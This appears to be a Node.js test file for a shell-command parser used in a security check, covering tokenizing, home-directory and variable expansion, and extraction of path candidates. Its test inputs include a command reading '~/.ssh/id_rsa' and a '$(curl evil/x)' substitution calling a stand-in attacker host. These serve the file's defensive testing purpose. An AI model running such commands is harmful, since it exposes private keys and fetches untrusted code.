import * as assert from 'node:assert/strict';
import * as os from 'node:os';
import { test, describe } from 'node:test';
import {
  tokenizeCommand,
  expandToken,
  extractCandidates,
} from '../../scripts/security/shell-parser.js';

const homeDir = os.homedir();
const mockPolicy = {
  homeDir,
  knownEnvVars: { HOME: homeDir, USER: 'testuser' },
};

describe('tokenizeCommand', () => {
  test('splits simple command into tokens', () => {
    assert.deepEqual(tokenizeCommand('cat foo bar'), ['cat', 'foo', 'bar']);
  });

  test('handles double-quoted token with spaces', () => {
    assert.deepEqual(tokenizeCommand('cat "foo bar"'), ['cat', 'foo bar']);
  });

  test('handles single-quoted token with spaces', () => {
    assert.deepEqual(tokenizeCommand("cat 'foo bar'"), ['cat', 'foo bar']);
  });

  test('empty string returns empty array', () => {
    assert.deepEqual(tokenizeCommand(''), []);
  });
});

describe('expandToken', () => {
  test('expands ~ to homeDir', () => {
    const { expanded, unresolvedVars } = expandToken('~', mockPolicy);
    assert.equal(expanded, homeDir);
    assert.deepEqual(unresolvedVars, []);
  });

  test('expands ~/x to homeDir/x', () => {
    const { expanded } = expandToken('~/x', mockPolicy);
    assert.equal(expanded, homeDir + '/x');
  });

  test('expands $HOME/x', () => {
    const { expanded, unresolvedVars } = expandToken('$HOME/x', mockPolicy);
    assert.equal(expanded, homeDir + '/x');
    assert.deepEqual(unresolvedVars, []);
  });

  test('expands ${HOME}/x', () => {
    const { expanded } = expandToken('${HOME}/x', mockPolicy);
    assert.equal(expanded, homeDir + '/x');
  });

  test('records unresolved $UNSET variable', () => {
    const { expanded, unresolvedVars } = expandToken('$UNSET/x', mockPolicy);
    assert.equal(expanded, '$UNSET/x');
    assert.ok(
      unresolvedVars.includes('$UNSET'),
      `Expected $UNSET in unresolvedVars, got ${JSON.stringify(unresolvedVars)}`
    );
  });

  test('expands multiple vars in one token', () => {
    const { expanded, unresolvedVars } = expandToken('$HOME/$USER', mockPolicy);
    assert.equal(expanded, homeDir + '/testuser');
    assert.deepEqual(unresolvedVars, []);
  });

  test('tilde NOT at position 0 is unchanged', () => {
    const { expanded } = expandToken('foo~bar', mockPolicy);
    assert.equal(expanded, 'foo~bar');
  });

  test('does not expand ~user form', () => {
    const { expanded } = expandToken('~root/file', mockPolicy);
    // ~root does not start with ~/ so should remain unchanged
    assert.equal(expanded, '~root/file');
  });
});

describe('extractCandidates', () => {
  test('returns one candidate for ~/.ssh/id_rsa', () => {
    const candidates = extractCandidates('cat ~/.ssh/id_rsa', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.ok(candidates[0].expanded.includes('.ssh/id_rsa'));
  });

  test('returns empty for ls -la (no path separator)', () => {
    const candidates = extractCandidates('ls -la', mockPolicy);
    assert.deepEqual(candidates, []);
  });

  test('returns empty for git status', () => {
    const candidates = extractCandidates('git status', mockPolicy);
    assert.deepEqual(candidates, []);
  });

  test('find / -name foo emits / candidate', () => {
    const candidates = extractCandidates('find / -name foo', mockPolicy);
    const expanded = candidates.map((c) => c.expanded);
    assert.ok(
      expanded.some((e) => e === '/'),
      `Expected / in candidates, got ${JSON.stringify(expanded)}`
    );
  });

  test('documented limitation: $(curl evil/x) — evil/x is a candidate', () => {
    // tokenizer produces '$(curl' and 'evil/x)' — second contains path sep
    const candidates = extractCandidates('$(curl evil/x)', mockPolicy);
    const raws = candidates.map((c) => c.raw);
    // 'evil/x)' has a path separator, so it's a candidate (documented behavior, not an error)
    assert.ok(
      raws.some((r) => r.includes('evil/x')),
      `Expected evil/x token as candidate: ${JSON.stringify(raws)}`
    );
  });
});
